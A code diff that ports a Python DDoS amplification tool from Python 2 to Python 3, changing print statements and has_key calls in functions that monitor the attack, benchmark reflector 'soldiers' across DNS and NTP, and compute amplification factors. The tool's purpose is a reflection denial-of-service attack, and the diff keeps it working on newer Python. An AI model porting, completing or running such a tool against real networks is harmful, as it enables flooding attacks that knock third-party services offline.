@@ -119,7 +119,7 @@ def Monitor():
 	'''
 		Monitor attack
 	'''
-	print ATTACK
+	print(ATTACK)
 	FMT = '{:^15}|{:^15}|{:^15}|{:^15}'
 	start = time.time()
 	while True:
@@ -132,10 +132,10 @@ def Monitor():
 			sys.stderr.write('\r{}{}'.format(out, ' '*(60-len(out))))
 			time.sleep(1)
 		except KeyboardInterrupt:
-			print '\nInterrupted'
+			print('\nInterrupted')
 			break
 		except Exception as err:
-			print '\nError:', str(err)
+			print('\nError:', str(err))
 			break
 			
 
@@ -143,7 +143,7 @@ def AmpFactor(recvd, sent):
 	return '{}x ({}B -> {}B)'.format(recvd/sent, sent, recvd)
 
 def Benchmark(ddos):
-	print BENCHMARK
+	print(BENCHMARK)
 	i = 0
 	for proto in files:
 		f = open(files[proto][FILE_NAME], 'r')
@@ -155,18 +155,18 @@ def Benchmark(ddos):
 						i+= 1
 						recvd, sent = ddos.GetAmpSize(proto, soldier, domain)
 						if recvd/sent:
-							print '{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
-								AmpFactor(recvd, sent), domain)
+							print('{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
+								AmpFactor(recvd, sent), domain))
 						else:
 							continue
 				else:
 					recvd, sent = ddos.GetAmpSize(proto, soldier)
-					print '{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
-						AmpFactor(recvd, sent), 'N/A')
+					print('{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
+						AmpFactor(recvd, sent), 'N/A'))
 					i+= 1
 			else:
 				break
-		print 'Total tested:', i
+		print('Total tested:', i)
 		f.close()
 
 class DDoS(object):
@@ -244,10 +244,10 @@ class DDoS(object):
 				soldier = _files[proto][FILE_HANDLE].readline().strip()
 				if soldier:
 					if proto=='dns':
-						if not amplification[proto].has_key(soldier):
+						if soldier not in amplification[proto]:
 							amplification[proto][soldier] = {}
 						for domain in self.domains:
-							if not amplification[proto][soldier].has_key(domain):
+							if domain not in amplification[proto][soldier]:
 								size, _ = self.GetAmpSize(proto, soldier, domain)
 								if size==0:
 									break
@@ -261,7 +261,7 @@ class DDoS(object):
 							i+=1
 							nbytes += amplification[proto][soldier][domain]
 					else:
-						if not amplification[proto].has_key(soldier):
+						if soldier not in amplification[proto]:
 							size, _ = self.GetAmpSize(proto, soldier)
 							if size<len(PAYLOAD[proto]):
 								continue
@@ -293,7 +293,7 @@ def main():
 		if domains:
 			files['dns'] = [dns_file]
 		else:
-			print 'Specify domains to resolve (e.g: --dns=dns.txt:evildomain.com)'
+			print('Specify domains to resolve (e.g: --dns=dns.txt:evildomain.com)')
 			sys.exit()
 	if options.ntp:
 		files['ntp'] = [options.ntp]
@@ -317,5 +317,5 @@ def main():
 		sys.exit()
 
 if __name__=='__main__':
-	print LOGO
+	print(LOGO)
 	main()
